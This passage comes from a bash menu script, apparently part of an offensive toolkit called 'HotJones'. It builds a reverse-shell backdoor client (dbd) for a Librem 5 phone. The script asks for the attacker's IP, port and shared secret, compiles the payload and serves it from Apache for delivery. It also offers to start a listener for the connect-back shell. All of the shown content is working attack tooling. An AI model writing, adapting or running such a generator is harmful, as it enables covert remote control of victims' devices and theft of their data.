echo -e "\E[1;34m::::: \e[97mThis Client Will Be Placed On Your Librem 5 & Executed \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mThe Client Will Then Connect Back To Your \"Controller\" Server \E[1;34m:::::"
PS3='Enter your choice: ENTER=Options Menu | 2=Main Menu | 3=QUIT: '
options=("Librem 5 Client Connector Generator" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
		"Librem 5 Client Connector Generator")	
		clear
		read -p "Where is your conroller server? (External IP or Domain Name)" attackerip
		echo ""
		read -p "What port will you be listening on? (You Will Need Port Forwarding Setup If Behind a Router/Firewall)" attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your client...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerip/$attackerip/g" ~/HotJones/misc/dbd/conf/dbd_unix_reverse.conf > ~/HotJones/misc/dbd/dbd_unix_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" ~/HotJones/misc/dbd/dbd_unix_reverse1.conf > ~/HotJones/misc/dbd/dbd_unix_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/HotJones/misc/dbd/dbd_unix_reverse2.conf > ~/HotJones/misc/dbd/dbd.h
		rm ~/HotJones/misc/dbd/dbd_unix_reverse1.conf
		rm ~/HotJones/misc/dbd/dbd_unix_reverse2.conf
		cd ~/HotJones/misc/dbd/
		make unix
		chmod +x dbd
		cp ~/HotJones/misc/dbd/dbd /var/www/html
		chown www-data:www-data /var/www/html/dbd
		echo "Starting Apache server to host payloads..."
		SERVICE=Apache;
	secs=$(date '+%S');
	if service apache2 status | grep -v grep | grep running > /dev/null
	then
		echo "$SERVICE service running"
	else
		echo "$SERVICE is not running, Starting service." 
		service apache2 start
	fi  
		#rm dbd
		#clear
		cd ~/HotJones
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear
			else
				echo -e "\e[1;34mWhen you are ready to receive your client connection, enter the following in your terminal:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
			fi
			;;
		"Main Menu")
            ~/HotJones/hijack.sh
            ;;
		"Quit")
            echo "PREEEOOOOWWWWWWWW" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 

;;

"0" | "0" )
  # 
    echo -e "\E[1;34m::::: \e[97mChairscoot.. \E[1;34m:::::"
    echo "PREEEOOOOWWWWWWWW" && exit 1 

;;
   
esac

tput sgr0                               # Reset colors to "normal."

exit 0
